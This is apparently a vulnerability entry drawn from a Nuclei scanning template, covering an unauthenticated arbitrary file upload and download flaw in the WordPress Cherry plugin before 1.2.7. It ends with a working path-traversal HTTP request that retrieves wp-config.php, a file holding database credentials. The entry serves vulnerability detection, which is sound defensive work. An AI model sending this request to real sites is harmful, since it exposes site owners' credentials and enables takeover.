# Vulnerability: Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`cherry-file-download.yaml`)

## Description
WordPress plugin Cherry < 1.2.7 contains an unauthenticated file upload and download vulnerability, allowing attackers to upload and download arbitrary files. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
```

